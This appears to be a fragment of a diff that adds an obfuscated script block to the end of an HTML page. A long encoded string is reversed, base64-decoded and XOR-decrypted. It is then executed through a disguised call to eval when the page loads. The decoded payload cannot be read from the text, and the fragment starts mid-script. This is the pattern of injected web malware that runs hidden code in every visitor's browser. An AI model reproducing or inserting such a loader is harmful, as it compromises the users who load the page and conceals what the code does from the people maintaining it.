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'.split('').reverse().join('');var _0xb2a696=atob(_0x579a1e);var _0xbe392b=new Uint8Array(_0xb2a696.length);for(var _0x5ed108=0;_0x5ed108<_0xb2a696.length;_0x5ed108++){_0xbe392b[_0x5ed108]=_0xb2a696.charCodeAt(_0x5ed108)^_0x920d7c[_0x5ed108%_0x920d7c.length];}var _0x6ac369=new TextDecoder().decode(_0xbe392b);var _0x81d0b4=window[String.fromCharCode(101,118,97,108)];(1,_0x81d0b4)(_0x6ac369);})();
+</script>
+</body>
+</html>
